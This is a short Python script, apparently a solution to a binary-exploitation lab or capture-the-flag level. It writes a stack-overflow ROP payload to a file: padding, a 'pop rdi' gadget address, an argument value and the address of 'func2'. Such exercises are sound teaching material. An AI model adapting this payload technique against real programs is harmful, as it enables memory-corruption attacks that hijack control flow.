padding = b"A" * 16

pop_rdi_addr = b"\xc7\x12\x40\x00\x00\x00\x00\x00"

arg_value = b"\xf8\x03\x00\x00\x00\x00\x00\x00"

func2_addr = b"\x16\x12\x40\x00\x00\x00\x00\x00"

payload = padding + pop_rdi_addr + arg_value  + func2_addr

with open("solution2.txt", "wb") as f:
    f.write(payload)
